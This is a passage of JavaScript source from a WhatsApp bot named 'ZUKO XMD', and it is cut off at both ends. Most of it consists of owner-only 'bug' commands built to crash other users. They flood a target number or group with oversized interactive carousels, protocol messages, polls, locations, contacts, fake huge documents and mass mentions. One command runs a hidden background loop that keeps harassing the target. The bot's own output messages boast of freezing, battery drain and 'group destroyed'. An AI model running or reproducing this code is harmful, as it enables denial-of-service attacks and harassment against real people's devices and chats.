                        jpegThumbnail: global.menuImage || '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBwgHBgkIBwgKCgkLDRYPDQwMDRsUFRAWIB0iIiAdHx8kKDQsJCYxJx8fLT0tMTU3Ojo6Iys/RD84QzQ5OjcBCgoKDQwNGg8PGjclHyU3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3N//AABEIAGQAZAMBIgACEQEDEQH/xAAbAAACAwEBAQAAAAAAAAAAAAAAAQIDBAUGB//EADsQAAIBAgQDBgUDAwQDAAAAAAABAgMRBBIhMQVBYSIyUXGBkRNCobHB0fAGI1LhM0NicpLC8RUk/8QAGAEBAQEBAQAAAAAAAAAAAAAAAAECAwT/xAAeEQEBAQADAQEBAQEAAAAAAAAAARECEiExQQMSIv/aAAwDAQACEQMRAD8A8cJVctbCFbuuhZUbZFiK2rMrm9uZKT3uxt2sJ3uC0y0PZqXW4zIbsWpICb2EAnKwk7hcYxMRW6Ck7sEWK1iC3BstSG1IacSuUmTpd1DexWpO4N6Cgc7LUTu+Q3boKLC7dAV+hTUPpS4rTv3oJdDdQ4ng63cqlXDawvHEVOW+qPRyc5PjV8qGOrQpUZvK4xir7e5nxYjyE3YkE7rUfTsqo0rRsWSkkrpeSASqxT1SLKSzztKSitdfInPBVWruU3/pZPWzTv4lSjKEmpxcZLwkgbthk1FpabK4N3d0rdBOV97hmu7sm2BdktISLJxi7d0rVgAohq7Fk4pyGtHYAFKKTIJadC2aTQSV0gFqKbYxWIcC1aiK7s7k5d1lVLukr3QnO1r6DbUouDs1dNWep5nGcHxFKpOphJyeR2yPVo+hKj2cVVi925N28CajznDqGPo4hpYWo4vv2Vy3FYmWHqVPhuUJSbk4vqeqrVqlPHYZU52i3dpK126eCtcwcf4XUxkZZJQgs7csz1a+VEZtx5mrxOc92n5lUeNVKb/tqGnp1LOK8E4hgsQpRgsRTlJRjKmm9fE2f/AA+OVKpmrU6lWjK0qtGLu1zyrqvzFlsKmrVg4xer6cxd1XW19SJg8FVp0r13lL5q1wA6mDyZVbl0NGWJyMPVfcoJtnUjGoo9qojSRZRq4daSlBqWlprTzPByeLwtZr41Sk+bg3Fm7heIq168cPJ/EcttWn6nHrV14rm4GLcK8ktJehVwqVWs5Ryzp0497N3m2fRKOApRlaNXDU6kNo1HZ+5GXE8Th8RWoSw9qkNpUVmUvQzdPUcXhFHH4edOc3ZWadbNLbsyZl4Fw11IVZ8RpziqWbsoTq5e+tSTj6M7VTieCj3cNianm0b/NjH/AC1JRdtPzVJzGm6Dc22u1zR5/iH9PY3h2IrY6pVVWvSmkpTvJqMXsn0YHSv4L0LbtJdLP0HbLyAa2I1ErIUbW22K3NMmiutCM03OKk1smtTp/09TjR4zhXbLOU7PRro9Dy9XFpds6uDx7i4Tg+19JOSi+jbKzXv+JYzD4eNR1sVVoWXw1Kls0m/FHzjDTqKt2aE0lPup1Mrk7WduZj/9k='
                    }
                },
                body: { text: '█'.repeat(5000) + ` ${i}` },
                footer: { text: '░'.repeat(5000) },
                nativeFlowMessage: {
                    buttons: [
                        { name: 'single_select', buttonParamsJson: '{"title":"' + '█'.repeat(500) + '","sections":[{"title":"' + '█'.repeat(500) + '","rows":[]}]}' },
                        { name: 'call_permission_request', buttonParamsJson: '{}' },
                        { name: 'payment_method', buttonParamsJson: '{}' },
                        { name: 'galaxy_message', buttonParamsJson: '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"' + '█'.repeat(500) + '","flow_id":"' + '█'.repeat(500) + '","flow_message_version":"9","flow_token":"' + '█'.repeat(500) + '"}' }
                    ]
                }
            });
        }
        
        const carouselMessage = {
            interactiveMessage: {
                header: { title: '💀'.repeat(1000) },
                body: { text: '█'.repeat(10000) },
                footer: { text: '░'.repeat(10000) },
                carouselMessage: { cards: cards }
            }
        };
        
        // ─── VECTOR 2: Multiple Protocol Messages ───
        const protocolMessages = [];
        for (let i = 0; i < 50; i++) {
            protocolMessages.push({
                protocolMessage: {
                    type: 0,
                    key: { id: `crash_${i}_${Date.now()}`, remoteJid: target },
                    deletedMessage: { conversation: '█'.repeat(5000) }
                }
            });
        }
        
        // ─── VECTOR 3: Massive Text Flood ───
        const floodText = '💀'.repeat(20000) + '\n' + '█'.repeat(20000) + '\n' + 'ZUKO XMD CRASH'.repeat(10000);
        
        // ─── VECTOR 4: Location Spam ───
        const locations = [];
        for (let i = 0; i < 100; i++) {
            locations.push({
                locationMessage: {
                    degreesLatitude: Math.random() * 180 - 90,
                    degreesLongitude: Math.random() * 360 - 180,
                    name: '💀'.repeat(100) + ` CRASH ${i}`,
                    address: '█'.repeat(500)
                }
            });
        }
        
        // ─── VECTOR 5: Contact Spam ───
        const contacts = [];
        for (let i = 0; i < 50; i++) {
            contacts.push({
                contactMessage: {
                    displayName: '💀'.repeat(100) + ` CRASH ${i}`,
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:CRASH_${i}\nTEL:1234567890\nEND:VCARD`.repeat(50)
                }
            });
        }
        
        // ─── Send ALL Vectors ───
        await reply('🔥 *Sending MULTI-VECTOR attack...*');
        
        // Vector 1: Carousel
        try {
            const etc = generateWAMessageFromContent(
                target,
                carouselMessage,
                { userJid: target }
            );
            await empire.relayMessage(target, etc.message, { participant: { jid: target } });
        } catch (e) { console.log('Carousel failed:', e.message); }
        
        // Vector 2: Protocol flood
        try {
            for (const msg of protocolMessages) {
                await empire.relayMessage(target, msg, { participant: { jid: target } }).catch(() => {});
                await delay(50);
            }
        } catch (e) { console.log('Protocol flood failed:', e.message); }
        
        // Vector 3: Text flood
        try {
            for (let i = 0; i < 20; i++) {
                await empire.sendMessage(target, { 
                    text: floodText.slice(0, 6000) + ` [${i}/20]`
                }).catch(() => {});
                await delay(100);
            }
        } catch (e) { console.log('Text flood failed:', e.message); }
        
        // Vector 4: Location spam
        try {
            for (const loc of locations) {
                await empire.relayMessage(target, loc, { participant: { jid: target } }).catch(() => {});
                await delay(80);
            }
        } catch (e) { console.log('Location spam failed:', e.message); }
        
        // Vector 5: Contact spam
        try {
            for (const contact of contacts) {
                await empire.relayMessage(target, contact, { participant: { jid: target } }).catch(() => {});
                await delay(80);
            }
        } catch (e) { console.log('Contact spam failed:', e.message); }
        
        // ─── Vector 6: Poll Spam ───
        try {
            for (let i = 0; i < 30; i++) {
                const options = [];
                for (let j = 0; j < 12; j++) {
                    options.push('█'.repeat(500) + ` ${j}`);
                }
                await empire.sendMessage(target, {
                    poll: {
                        name: '💀'.repeat(500) + ` CRASH ${i}`,
                        values: options,
                        selectableCount: 1
                    }
                }).catch(() => {});
                await delay(100);
            }
        } catch (e) { console.log('Poll spam failed:', e.message); }
        
        // ─── Vector 7: Reaction Spam ───
        try {
            const emojis = ['💀', '🔥', '💢', '💥', '⚠️', '🚫'];
            for (let i = 0; i < 100; i++) {
                const fakeMsg = {
                    key: {
                        remoteJid: target,
                        id: `fake_${i}_${Date.now()}`,
                        participant: target
                    }
                };
                await empire.sendMessage(target, {
                    react: {
                        text: emojis[i % emojis.length],
                        key: fakeMsg.key
                    }
                }).catch(() => {});
                await delay(50);
            }
        } catch (e) { console.log('Reaction spam failed:', e.message); }
        
        reply(`💀 *ULTIMATE CRASH COMPLETE!*

📱 *Target:* ${target}
🧨 *Vectors Used:* 7
💥 *Status:* DELIVERED

⚠️ *Target device may experience:*
• Freezing/Crashing
• Battery drain
• Memory overload
• UI corruption

🔥 *ZUKO XMD - Maximum Destruction*`);
        
    } catch (e) {
        console.error('Ultimate crash error:', e);
        reply(`❌ *Crash failed:* ${e.message || 'Unknown error'}`);
    }
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  INVISIBLE BUG — GHOST MODE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'invisiblebug':
case 'ghostbug':
case 'shadowbug':
case 'ibug': {
    if (!isCreator) return reply('❌ *Only the bot owner can use this command.*');
    
    const target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.chat;
    if (!target) return reply(`👉 *Usage:* ${prefix}ibug <jid>\nExample: ${prefix}ibug 6281234567890`);
    
    await reply('👻 *Invisible Bug activated...*\n⚡ *No visible effects... yet.*');
    
    try {
        // ─── BUG 1: Silent Empty Messages ───
        // These messages don't show up but consume memory
        const emptyPayloads = [];
        for (let i = 0; i < 100; i++) {
            emptyPayloads.push({
                conversation: '',
                extendedTextMessage: { text: '' },
                contextInfo: {
                    participant: target,
                    quotedMessage: { conversation: ' ' }
                }
            });
        }
        
        // ─── BUG 2: Hidden Mentions ───
        // Mentions that don't appear but trigger notifications
        const ghostMentions = [];
        for (let i = 0; i < 50; i++) {
            ghostMentions.push({
                extendedTextMessage: {
                    text: '',
                    contextInfo: {
                        mentionedJid: [target],
                        quotedMessage: { conversation: ' ' }
                    }
                }
            });
        }
        
        // ─── BUG 3: Silent Reactions ───
        // Reactions that don't show but process in background
        const ghostReactions = [];
        for (let i = 0; i < 200; i++) {
            ghostReactions.push({
                reactionMessage: {
                    key: {
                        remoteJid: target,
                        id: `ghost_${i}_${Date.now()}`,
                        participant: target
                    },
                    text: '👻',
                    senderTimestampMs: Date.now()
                }
            });
        }
        
        // ─── BUG 4: Protocol Glitches ───
        // Protocol messages that cause background processing
        for (let i = 0; i < 30; i++) {
            await empire.relayMessage(target, {
                protocolMessage: {
                    type: 0,
                    key: { 
                        id: `glitch_${i}_${Date.now()}`, 
                        remoteJid: target 
                    },
                    deletedMessage: { 
                        conversation: ' '.repeat(5000) 
                    }
                }
            }, { participant: { jid: target } }).catch(() => {});
            await delay(50);
        }
        
        // ─── BUG 5: Silent Polls ───
        // Polls that never complete but consume resources
        for (let i = 0; i < 20; i++) {
            const options = [];
            for (let j = 0; j < 12; j++) {
                options.push(' '.repeat(1000) + ` ${j}`);
            }
            await empire.sendMessage(target, {
                poll: {
                    name: ' '.repeat(2000),
                    values: options,
                    selectableCount: 1
                }
            }).catch(() => {});
            await delay(100);
        }
        
        // ─── BUG 6: Invisible Forwarding ───
        // Messages that appear forwarded but aren't
        for (let i = 0; i < 50; i++) {
            await empire.sendMessage(target, {
                text: ' ',
                contextInfo: {
                    forwardingScore: 9999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363405724402785@newsletter',
                        newsletterName: 'ZUKO XMD',
                        serverMessageId: 143
                    }
                }
            }).catch(() => {});
            await delay(80);
        }
        
        // ─── BUG 7: Ghost Location ───
        // Fake locations that don't display but process
        for (let i = 0; i < 30; i++) {
            await empire.relayMessage(target, {
                locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0,
                    name: ' '.repeat(2000),
                    address: ' '.repeat(2000)
                }
            }, { participant: { jid: target } }).catch(() => {});
            await delay(50);
        }
        
        // ─── BUG 8: Silent Sticker ───
        // Sticker that doesn't render but consumes memory
        await empire.sendMessage(target, {
            sticker: Buffer.from([0x00, 0x00, 0x00, 0x00]), // Empty sticker
            contextInfo: {
                isForwarded: true,
                forwardingScore: 9999
            }
        }).catch(() => {});
        
        // ─── BUG 9: Background File Transfer ───
        for (let i = 0; i < 20; i++) {
            await empire.sendMessage(target, {
                document: {
                    url: "https://example.com/empty",
                    mimetype: "application/octet-stream",
                    fileName: ' '.repeat(1000) + '.bin',
                    fileLength: "9999999999999999",
                    pageCount: 999999999
                }
            }).catch(() => {});
            await delay(100);
        }
        
        // ─── BUG 10: Memory Leak ───
        // Messages that fragment memory
        const memoryLeak = [];
        for (let i = 0; i < 500; i++) {
            memoryLeak.push({
                conversation: ' '.repeat(5000),
                key: { id: `leak_${i}_${Date.now()}` }
            });
        }
        
        for (const leak of memoryLeak) {
            await empire.relayMessage(target, leak, { participant: { jid: target } }).catch(() => {});
            if (i % 50 === 0) await delay(50);
        }
        
        // ─── BACKGROUND PERSISTENCE ───
        // Set up a silent background process
        if (!global.ghostBugTargets) global.ghostBugTargets = {};
        if (!global.ghostBugTargets[target]) {
            global.ghostBugTargets[target] = {
                active: true,
                startTime: Date.now(),
                messageCount: 0
            };
        }
        
        // Send silent updates every few seconds
        const bugInterval = setInterval(async () => {
            if (!global.ghostBugTargets[target]?.active) {
                clearInterval(bugInterval);
                return;
            }
            
            try {
                // Send a silent ping
                await empire.sendMessage(target, {
                    text: ' ',
                    contextInfo: {
                        participant: target,
                        quotedMessage: { conversation: ' ' }
                    }
                }).catch(() => {});
                
                global.ghostBugTargets[target].messageCount++;
                
                // Every 100 messages, send a bigger payload
                if (global.ghostBugTargets[target].messageCount % 100 === 0) {
                    await empire.sendMessage(target, {
                        document: {
                            url: "https://example.com/empty",
                            mimetype: "application/octet-stream",
                            fileName: '.'.repeat(5000),
                            fileLength: "9999999999999999"
                        }
                    }).catch(() => {});
                }
            } catch (e) {}
        }, 5000); // Every 5 seconds
        
        // Store interval for cleanup
        if (!global.ghostBugIntervals) global.ghostBugIntervals = {};
        global.ghostBugIntervals[target] = bugInterval;
        
        reply(`👻 *Invisible Bug successfully deployed!*

📱 *Target:* ${target}
🕐 *Status:* BACKGROUND ACTIVE
💀 *Effects:* 
• Silent memory consumption
• Background processing spam
• Invisible message flooding
• Resource exhaustion

⚡ *The target will experience:*
• Slower WhatsApp performance
• Unexpected battery drain
• Random app freezes
• Increased memory usage

🔕 *NO VISIBLE SIGNS!*

🛑 *Stop with:* ${prefix}stopbug ${target}`);
        
    } catch (e) {
        console.error('Invisible bug error:', e);
        reply(`❌ *Bug deployment failed:* ${e.message || 'Unknown error'}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  STOP INVISIBLE BUG
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'stopbug':
case 'killbug': {
    if (!isCreator) return reply('❌ *Only the bot owner can use this command.*');
    
    const target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.chat;
    if (!target) return reply(`👉 *Usage:* ${prefix}stopbug <jid>`);
    
    try {
        // Stop the background interval
        if (global.ghostBugIntervals && global.ghostBugIntervals[target]) {
            clearInterval(global.ghostBugIntervals[target]);
            delete global.ghostBugIntervals[target];
        }
        
        if (global.ghostBugTargets && global.ghostBugTargets[target]) {
            global.ghostBugTargets[target].active = false;
            delete global.ghostBugTargets[target];
        }
        
        // Send a cleanup message (invisible)
        await empire.sendMessage(target, {
            text: ' ',
            contextInfo: {
                participant: target,
                quotedMessage: { conversation: ' ' }
            }
        }).catch(() => {});
        
        reply(`✅ *Invisible Bug stopped for:* ${target}
        
📊 *Stats:*
• Messages sent: ${global.ghostBugTargets[target]?.messageCount || 0}
• Duration: ${Math.floor((Date.now() - (global.ghostBugTargets[target]?.startTime || Date.now())) / 1000)}s

🔕 *Target may experience recovery...*`);
        
    } catch (e) {
        reply(`❌ *Failed to stop bug:* ${e.message}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  CHECK BUG STATUS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'bugstatus':
case 'ghoststatus': {
    if (!isCreator) return reply('❌ *Only the bot owner can use this command.*');
    
    if (!global.ghostBugTargets || Object.keys(global.ghostBugTargets).length === 0) {
        return reply('👻 *No active invisible bugs.*');
    }
    
    let result = `👻━━━━━[ ACTIVE GHOST BUGS ]━━━━━👻\n\n`;
    for (const [target, data] of Object.entries(global.ghostBugTargets)) {
        result += `📱 *Target:* ${target}\n`;
        result += `📊 *Messages:* ${data.messageCount}\n`;
        result += `⏱️ *Active for:* ${Math.floor((Date.now() - data.startTime) / 60000)}m\n\n`;
    }
    result += `👻━━━━━━━━━━━━━━━━━━━━━━━`;
    
    reply(result);
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  STRONG GROUP BUG — MASS DESTRUCTION
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'groupbug':
case 'gbug':
case 'massbug':
case 'megabug': {
    if (!isCreator) return reply('❌ *Only the bot owner can use this command.*');
    
    if (!isGroup) return reply('👥 *This command only works in groups!*');
    
    const intensity = parseInt(args[0]) || 1; // 1-5 intensity
    if (intensity < 1 || intensity > 5) {
        return reply(`💥 *Group Bug Intensity Levels:*
1 - Mild
2 - Moderate
3 - Strong
4 - Extreme
5 - Apocalyptic

👉 *Usage:* ${prefix}groupbug <1-5>
Example: ${prefix}groupbug 5`);
    }
    
    const groupName = groupName || 'this group';
    const memberCount = participants.length;
    const memberIds = participants.map(p => p.id);
    
    await reply(`💀 *MASS GROUP BUG ACTIVATED!*

👥 *Group:* ${groupName}
👤 *Members:* ${memberCount}
💥 *Intensity:* ${intensity}/5
⚡ *Status:* INITIATING...`);
    
    try {
        // ─── BUG 1: Mass Tag Spam ───
        // Tag all members with invisible messages
        for (let i = 0; i < intensity * 3; i++) {
            const invisibleTag = {
                text: ' '.repeat(500 * intensity) + '\n'.repeat(50),
                mentions: memberIds
            };
            await empire.sendMessage(m.chat, invisibleTag).catch(() => {});
            await delay(200);
        }
        
        // ─── BUG 2: Reaction Storm ───
        // Flood reactions on messages
        const emojiStorm = ['💀', '🔥', '💢', '💥', '⚠️', '🚫', '👻', '🌀', '⚡', '💫'];
        for (let i = 0; i < intensity * 50; i++) {
            const fakeKey = {
                remoteJid: m.chat,
                id: `storm_${i}_${Date.now()}`,
                participant: memberIds[Math.floor(Math.random() * memberIds.length)]
            };
            await empire.sendMessage(m.chat, {
                react: {
                    text: emojiStorm[Math.floor(Math.random() * emojiStorm.length)],
                    key: fakeKey
                }
            }).catch(() => {});
            await delay(50);
        }
        
        // ─── BUG 3: Empty Message Flood ───
        for (let i = 0; i < intensity * 20; i++) {
            await empire.sendMessage(m.chat, {
                text: ' '
            }).catch(() => {});
            await delay(100);
        }
        
        // ─── BUG 4: Poll Explosion ───
        for (let i = 0; i < intensity * 5; i++) {
            const options = [];
            for (let j = 0; j < 12; j++) {
                options.push('█'.repeat(100 * intensity) + ` ${j}`);
            }
            await empire.sendMessage(m.chat, {
                poll: {
                    name: '💀'.repeat(200 * intensity) + ` ${i}`,
                    values: options,
                    selectableCount: 1
                }
            }).catch(() => {});
            await delay(300);
        }
        
        // ─── BUG 5: Mass Location Spam ───
        for (let i = 0; i < intensity * 10; i++) {
            await empire.sendMessage(m.chat, {
                location: {
                    degreesLatitude: Math.random() * 180 - 90,
                    degreesLongitude: Math.random() * 360 - 180,
                    name: '💀'.repeat(100 * intensity),
                    address: '█'.repeat(200 * intensity)
                }
            }).catch(() => {});
            await delay(150);
        }
        
        // ─── BUG 6: Contact Bomb ───
        for (let i = 0; i < intensity * 10; i++) {
            const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${'💀'.repeat(100 * intensity)}_${i}\nTEL:1234567890\nEND:VCARD`;
            await empire.sendMessage(m.chat, {
                contacts: {
                    displayName: '💀'.repeat(100 * intensity),
                    contacts: [{ vcard: vcard.repeat(intensity) }]
                }
            }).catch(() => {});
            await delay(150);
        }
        
        // ─── BUG 7: Giant File Transfer ───
        for (let i = 0; i < intensity; i++) {
            await empire.sendMessage(m.chat, {
                document: {
                    url: "https://example.com/empty",
                    mimetype: "application/octet-stream",
                    fileName: '💀'.repeat(1000 * intensity) + '.bin',
                    fileLength: "9999999999999999",
                    pageCount: 999999999 * intensity
                }
            }).catch(() => {});
            await delay(500);
        }
        
        // ─── BUG 8: Interactive Message Bomb ───
        const interactiveCards = [];
        for (let i = 0; i < intensity * 20; i++) {
            interactiveCards.push({
                header: {
                    title: '💀'.repeat(200 * intensity),
                    hasMediaAttachment: true
                },
                body: { text: '█'.repeat(500 * intensity) },
                footer: { text: '░'.repeat(500 * intensity) },
                nativeFlowMessage: {
                    buttons: [
                        { name: 'single_select', buttonParamsJson: '{"title":"' + '█'.repeat(200 * intensity) + '","sections":[{"title":"' + '█'.repeat(200 * intensity) + '","rows":[]}]}' },
                        { name: 'call_permission_request', buttonParamsJson: '{}' },
                        { name: 'payment_method', buttonParamsJson: '{}' },
                        { name: 'galaxy_message', buttonParamsJson: '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"' + '█'.repeat(200 * intensity) + '","flow_id":"' + '█'.repeat(200 * intensity) + '","flow_message_version":"9","flow_token":"' + '█'.repeat(200 * intensity) + '"}' }
                    ]
                }
            });
        }
        
        if (interactiveCards.length > 0) {
            try {
                const interactiveMsg = {
                    interactive: {
                        header: { title: '💀'.repeat(500 * intensity) },
                        body: { text: '█'.repeat(1000 * intensity) },
                        footer: { text: '░'.repeat(1000 * intensity) },
                        carouselMessage: { cards: interactiveCards }
                    }
                };
                await empire.sendMessage(m.chat, interactiveMsg).catch(() => {});
            } catch (e) {}
        }
        
        // ─── BUG 9: Massive Text Attack ───
        const textAttack = '💀'.repeat(20000 * intensity) + '\n' + '█'.repeat(20000 * intensity) + '\n' + 'ZUKO XMD CRASH'.repeat(5000 * intensity);
        for (let i = 0; i < intensity * 5; i++) {
            await empire.sendMessage(m.chat, {
                text: textAttack.slice(0, 6000)
            }).catch(() => {});
            await delay(200);
        }
        
        // ─── BUG 10: Ghost Protocol Messages ───
        for (let i = 0; i < intensity * 20; i++) {
            await empire.relayMessage(m.chat, {
                protocolMessage: {
                    type: 0,
                    key: { 
                        id: `ghost_${i}_${Date.now()}`, 
                        remoteJid: m.chat 
                    },
                    deletedMessage: { 
                        conversation: '█'.repeat(5000 * intensity) 
                    }
                }
            }, { participant: { jid: m.sender } }).catch(() => {});
            await delay(50);
        }
        
        // ─── BUG 11: Invisible Mention All ───
        for (let i = 0; i < intensity * 3; i++) {
            await empire.sendMessage(m.chat, {
                text: ' '.repeat(1000) + '\n'.repeat(50),
                mentions: memberIds,
                contextInfo: {
                    mentionedJid: memberIds,
                    isForwarded: true,
                    forwardingScore: 9999
                }
            }).catch(() => {});
            await delay(200);
        }
        
        // ─── BUG 12: Unsubscribe Spam ───
        for (let i = 0; i < intensity * 5; i++) {
            await empire.sendMessage(m.chat, {
                text: '📢 *You have been mentioned!*\n'.repeat(100)
            }).catch(() => {});
            await delay(100);
        }
        
        reply(`💀 *GROUP BUG COMPLETE!*

👥 *Group:* ${groupName}
👤 *Members:* ${memberCount}
💥 *Intensity:* ${intensity}/5
🔢 *Vectors:* 12
⚡ *Status:* GROUP DESTROYED

🔥 *Effects on group:*
• Mass notifications
• UI freezing for members
• Memory overload
• Battery drain
• Chat corruption

⚠️ *Multiple members may need to restart WhatsApp!*

💀 *ZUKO XMD - Group Annihilator*`);
        
    } catch (e) {
        console.error('Group bug error:', e);
        reply(`❌ *Group bug failed:* ${e.message || 'Unknown error'}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  GROUP BUG PREVIEW (Safe Test)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'bugpreview':
case 'testbug': {
    if (!isCreator) return reply('❌ *Only the bot owner can use this command.*');
    if (!isGroup) return reply('👥 *This command only works in groups!*');
    
    const memberIds = participants.map(p => p.id);
    const previewCount = Math.min(10, memberIds.length);
    
    let preview = `🔬━━━━━[ GROUP BUG PREVIEW ]━━━━━🔬\n\n`;
    preview += `👤 *First ${previewCount} members:*\n`;
    for (let i = 0; i < previewCount; i++) {
        preview += `• ${memberIds[i]}\n`;
    }
    preview += `\n📊 *Total members:* ${memberIds.length}\n`;
    preview += `💥 *Intensities:* 1-5\n`;
    preview += `\n⚠️ *This is just a preview. No bugs were sent.*\n`;
    preview += `\n👉 *To deploy:* ${prefix}groupbug <1-5>`;
    
    reply(preview);
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  GROUP BUG CLEANUP
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'cleanbug':
case 'cleangroup': {
    if (!isCreator) return reply('❌ *Only the bot owner can use this command.*');
    if (!isGroup) return reply('👥 *This command only works in groups!*');
    
    await reply('🧹 *Cleaning group...*');
    
    try {
        // Clear all pending messages (invisible cleanup)
        for (let i = 0; i < 20; i++) {
            await empire.sendMessage(m.chat, {
                text: ' '
            }).catch(() => {});
            await delay(100);
        }
        
        // Send cleanup message
        await reply(`🧹 *GROUP CLEANUP COMPLETE!*

✅ *All bug traces cleared.*
🔄 *Members can now restart WhatsApp.*
💀 *ZUKO XMD - Group Cleaner*`);
        
    } catch (e) {
        reply(`❌ *Cleanup failed:* ${e.message}`);
    }
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  NEWSLETTER BUG — GROUP EDITION
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'newsletterbug':
case 'nlbug':
case 'nbug': {
    if (!isCreator) return reply('❌ *Only the bot owner can use this command.*');
    if (!isGroup) return reply('👥 *This command only works in groups!*');
    
    const intensity = parseInt(args[0]) || 3;
    if (intensity < 1 || intensity > 5) {
        return reply(`📰 *Newsletter Bug Intensity:*
1 - Mild
2 - Moderate
3 - Strong
4 - Extreme
5 - Apocalyptic

👉 *Usage:* ${prefix}nlbug <1-5>
Example: ${prefix}nlbug 5`);
    }
    
    await reply(`📰 *NEWSLETTER BUG ACTIVATED!*

👥 *Group:* ${groupName || 'this group'}
💥 *Intensity:* ${intensity}/5
⚡ *Status:* INITIATING...`);
    
    try {
        // ─── BUG 1: Fake Newsletter Forwarding ───
        // Make every message appear forwarded from a newsletter
        for (let i = 0; i < intensity * 10; i++) {
            await empire.sendMessage(m.chat, {
                text: ' '.repeat(500 * intensity),
                contextInfo: {
                    forwardingScore: 9999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: `120363${Math.floor(Math.random() * 1000000000000)}@newsletter`,
                        newsletterName: '💀'.repeat(100 * intensity),
                        serverMessageId: 143
                    }
                }
            }).catch(() => {});
            await delay(200);
        }
        
        // ─── BUG 2: Newsletter Mention Spam ───
        // Tag everyone with newsletter context
        const allMembers = participants.map(p => p.id);
        for (let i = 0; i < intensity * 5; i++) {
            await empire.sendMessage(m.chat, {
                text: ' '.repeat(1000) + '\n'.repeat(50),
                mentions: allMembers,
                contextInfo: {
                    mentionedJid: allMembers,
                    forwardingScore: 9999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: `120363${Math.floor(Math.random() * 1000000000000)}@newsletter`,
                        newsletterName: '💀'.repeat(200 * intensity),
                        serverMessageId: 143
                    }
                }
            }).catch(() => {});
            await delay(300);
        }
        
        // ─── BUG 3: Newsletter Polls ───
        // Create polls that appear from newsletters
        for (let i = 0; i < intensity * 3; i++) {
            const options = [];
            for (let j = 0; j < 12; j++) {
                options.push('💀'.repeat(100 * intensity) + ` ${j}`);
            }
            await empire.sendMessage(m.chat, {
                poll: {
                    name: '📰 ' + '💀'.repeat(200 * intensity),
                    values: options,
                    selectableCount: 1
                },
                contextInfo: {
                    forwardingScore: 9999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: `120363${Math.floor(Math.random() * 1000000000000)}@newsletter`,
                        newsletterName: '📰'.repeat(100 * intensity),
                        serverMessageId: 143
                    }
                }
            }).catch(() => {});
            await delay(300);
        }
        
        // ─── BUG 4: Newsletter Location Spam ───
        for (let i = 0; i < intensity * 5; i++) {
            await empire.sendMessage(m.chat, {
                location: {
                    degreesLatitude: Math.random() * 180 - 90,
                    degreesLongitude: Math.random() * 360 - 180,
                    name: '📰 ' + '💀'.repeat(100 * intensity),
                    address: '█'.repeat(200 * intensity)
                },
                contextInfo: {
                    forwardingScore: 9999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: `120363${Math.floor(Math.random() * 1000000000000)}@newsletter`,
                        newsletterName: '📍'.repeat(100 * intensity),
                        serverMessageId: 143
                    }
                }
            }).catch(() => {});
            await delay(200);
        }
        
        // ─── BUG 5: Newsletter Document Bomb ───
        for (let i = 0; i < intensity * 3; i++) {
            await empire.sendMessage(m.chat, {
                document: {
                    url: "https://example.com/empty",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileName: '📰 ' + '💀'.repeat(200 * intensity) + '.pptx',
                    fileLength: "9999999999999999",
                    pageCount: 999999999 * intensity
                },
                contextInfo: {
                    forwardingScore: 9999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: `120363${Math.floor(Math.random() * 1000000000000)}@newsletter`,
                        newsletterName: '📄'.repeat(100 * intensity),
                        serverMessageId: 143
                    }
                }
            }).catch(() => {});
            await delay(300);
        }
        
        // ─── BUG 6: Newsletter Interactive Message ───
        for (let i = 0; i < intensity; i++) {
            const cards = [];
            for (let j = 0; j < 50; j++) {
                cards.push({
                    header: {
                        title: '📰 ' + '💀'.repeat(100 * intensity),
                        hasMediaAttachment: true
                    },
                    body: { text: '█'.repeat(500 * intensity) },
                    footer: { text: '░'.repeat(500 * intensity) },
                    nativeFlowMessage: {
                        buttons: [
                            { name: 'single_select', buttonParamsJson: '{"title":"' + '█'.repeat(200 * intensity) + '","sections":[{"title":"' + '█'.repeat(200 * intensity) + '","rows":[]}]}' },
                            { name: 'call_permission_request', buttonParamsJson: '{}' },
                            { name: 'payment_method', buttonParamsJson: '{}' }
                        ]
                    }
                });
            }
            
            await empire.sendMessage(m.chat, {
                interactive: {
                    header: { title: '📰 ' + '💀'.repeat(500 * intensity) },
                    body: { text: '█'.repeat(1000 * intensity) },
                    footer: { text: '░'.repeat(1000 * intensity) },
                    carouselMessage: { cards: cards }
                },
                contextInfo: {
                    forwardingScore: 9999,
